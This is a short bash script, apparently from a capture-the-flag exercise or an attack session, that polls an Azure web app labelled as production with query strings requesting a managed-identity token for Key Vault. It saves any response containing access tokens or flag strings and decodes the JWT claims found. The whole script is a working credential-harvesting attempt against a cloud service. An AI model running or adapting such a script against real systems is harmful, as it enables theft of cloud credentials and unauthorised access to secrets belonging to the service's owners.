#!/usr/bin/env bash
set -uo pipefail
B=https://app-tbl-reporting-prod.azurewebsites.net
echo "### persistent poll of the reporting app"
for i in $(seq 1 22); do
  for Q in "/" "/?resource=https://vault.azure.net" "/?resource=https://vault.azure.net&client_id=7a85156a-01c4-4e61-8472-40a92107159b"; do
    OUT=$(curl -sS --max-time 55 "$B$Q" 2>&1 || true)
    if [ -n "$OUT" ] && ! echo "$OUT" | grep -q "Operation timed out"; then
      echo "[$i] $Q"
      echo "$OUT" | head -c 1500; echo
      if echo "$OUT" | grep -qiE 'access_token|DF26\{|flag\{'; then
        echo ">>> INTERESTING RESPONSE ABOVE"
        echo "$OUT" > /tmp/hit.json
      fi
    fi
  done
  sleep 6
done
if [ -f /tmp/hit.json ]; then
  echo "### decoding any JWT found"
  python3 - <<'PY'
import re,json,base64
d=open("/tmp/hit.json").read()
for m in re.finditer(r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+", d):
    p=m.group(0).split(".")[1]; p+="="*(-len(p)%4)
    c=json.loads(base64.urlsafe_b64decode(p))
    print("aud:",c.get("aud"),"appid:",c.get("appid"),"oid:",c.get("oid"),"xms_mirid:",c.get("xms_mirid"))
PY
fi
echo "=== done ==="